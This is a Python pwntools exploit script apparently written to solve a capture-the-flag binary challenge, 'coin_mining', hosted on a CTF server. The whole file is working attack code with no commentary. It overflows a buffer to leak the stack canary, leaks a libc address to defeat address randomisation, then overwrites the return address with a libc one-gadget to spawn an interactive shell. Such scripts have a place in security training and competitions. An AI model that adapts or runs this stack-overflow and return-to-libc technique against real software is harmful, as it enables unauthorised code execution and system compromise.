#!/usr/bin/python3

from pwn import *

exe = ELF('coin_mining_patched', checksec=False)
libc = ELF('libc.so.6', checksec=False)
context.binary = exe


def GDB():
    if not args.REMOTE:
        gdb.attach(p, gdbscript='''


                c
                ''')
        input()


def info(msg): return log.info(msg)
def sla(msg, data): return p.sendlineafter(msg, data)
def sa(msg, data): return p.sendafter(msg, data)
def sl(data): return p.sendline(data)
def s(data): return p.send(data)


if args.REMOTE:
    p = process(
        "ncat --ssl coin-mining-2dc636504c30cd73.chall.ctf.blackpinker.com 443".split())
else:
    p = process(exe.path)

GDB()
sla(b"coin? \n", b"1")
pay = b"notHMCUS-CTF{a_coin_must_be_here}\n".ljust(137, b"a")
sa(b"you: ", pay)

p.recvuntil(b"a" * 102)
canary = u64(p.recvuntil(b"??", drop=True)) - 0x61
info("canary: " + hex(canary))
pay = b"a" * 136 + b"b" * 16
sa(b"again: ", pay)

p.recvuntil(b"b" * 16)
libc_leak = u64(p.recv(6) + b"\0\0")
info("leak libc: " + hex(libc_leak))
libc.address = libc_leak - 138135
info("libc base: " + hex(libc.address))

pop_rdi = libc.address + 0x000000000002155f
ret = ""
pay = b"notHMCUS-CTF{a_coin_must_be_here}\n".ljust(136, b"\0") + p64(canary) + p64(0x1)
pay += flat(
    libc.address + 0x4f322
)
sa(b"again: ", pay)

p.interactive()
